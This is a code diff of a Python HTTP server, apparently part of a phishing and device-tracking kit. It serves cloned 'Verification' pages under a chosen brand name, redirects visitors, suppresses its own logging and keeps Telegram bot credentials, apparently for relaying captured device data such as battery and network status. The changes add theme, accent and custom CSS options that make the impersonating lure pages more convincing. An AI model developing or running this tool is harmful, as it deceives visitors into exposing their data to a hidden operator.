@@ -14,6 +14,9 @@ class AuraHandler(http.server.SimpleHTTPRequestHandler):
     brand_name = "Verification"
     telegram_token = None
     telegram_chat_id = None
+    theme = "dark"
+    accent = None
+    custom_css = None
 
     def log_message(self, format, *args):
         pass
@@ -43,7 +46,13 @@ class AuraHandler(http.server.SimpleHTTPRequestHandler):
             self.end_headers()
             
             # Generate dynamic template based on user choice
-            rendered = TemplateCloner.generate_template(AuraHandler.brand_name, AuraHandler.redirect_url)
+            rendered = TemplateCloner.generate_template(
+                AuraHandler.brand_name,
+                AuraHandler.redirect_url,
+                theme=getattr(AuraHandler, "theme", "dark"),
+                accent=getattr(AuraHandler, "accent", None),
+                custom_css=getattr(AuraHandler, "custom_css", None),
+            )
             self.wfile.write(rendered.encode('utf-8'))
         except Exception:
             pass
@@ -134,12 +143,16 @@ Battery: {body.get('battery')} | Net: {body.get('network')}
 
 class AuraServerManager:
     @staticmethod
-    def start_server(port, brand_name, redirect_output, tg_token=None, tg_chat_id=None):
+    def start_server(port, brand_name, redirect_output, tg_token=None, tg_chat_id=None,
+                     theme="dark", accent=None, custom_css=None):
         DatabaseManager.init_db()
         AuraHandler.brand_name = brand_name
         AuraHandler.redirect_url = redirect_output
         AuraHandler.telegram_token = tg_token
         AuraHandler.telegram_chat_id = tg_chat_id
+        AuraHandler.theme = theme or "dark"
+        AuraHandler.accent = accent
+        AuraHandler.custom_css = custom_css
 
         server = socketserver.ThreadingTCPServer(("", port), AuraHandler)
         return server
